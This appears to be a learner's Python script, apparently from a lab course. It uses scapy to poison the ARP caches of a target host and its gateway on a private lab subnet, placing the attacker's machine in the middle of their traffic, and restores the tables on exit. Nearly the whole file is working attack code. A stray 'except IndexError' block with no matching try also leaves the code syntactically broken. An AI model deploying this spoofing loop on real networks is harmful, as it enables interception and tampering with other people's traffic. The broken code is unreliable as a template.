#!/usr/bin/env python

import scapy.all as scapy
import time
import sys


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

except IndexError
        pass





# set op to 2 for arp respond (for scapy parameters refer to scapy_options.py or onenote)
# packet creation to redirect them to the target i will act as the router the mac table of the target will associate
# my mac with the routers IP
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    # examine the packet to confirm the flow
    # print(packet.show())
    # print(packet.summary())
    # now send the packet
    scapy.send(packet, verbose=False)
    # then check the target machine again with arp -a (the router's 1p is acossiated with attacker's mac)
    # check the attackers mac with ifconfig eth0

# restore arp tables of the router and the target back to normal
# it will take the ip of the target and the ip of the router
def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    # examine the packet to confirm the flow
    # print(packet.show())
    # print(packet.summary())
    # send the packet for times just in case ...
    scapy.send(packet, count=4, verbose=False)


target_ip = "192.168.56.5"
gateway_ip = "192.168.56.4"

# Be in the middle of the connection and send continiously packets and sleep two secs
# to maintain spoofing. otherwise it will send one packet only and mac address will change
# to original
count = 0
try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        # counter
        count = count + 2
        # print("[+] Sent {} Packets".format(count))
        # or
        # print(f'[+] Sent {count} packets')
        # or
        # overwrite line with \r and put a comma in the end of print statement for dynamic printing
        # print("\r [+] Packets Sent: " + str(count)),
        # optimized for python3 for dynamic printing
        # add , end="" in the next line
        print("\r [+] Packets Sent: " + str(count))
        # flush everything out of the buffer
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("[+] Detected CTRL + C ... Resetting ARP tables.... Please Wait.\n")
    # reset the dest machine with the correct mac values of the router machine
    restore(target_ip, gateway_ip)
    # reset the router machine with the correct mac values of the dest machine
    restore(gateway_ip, target_ip)









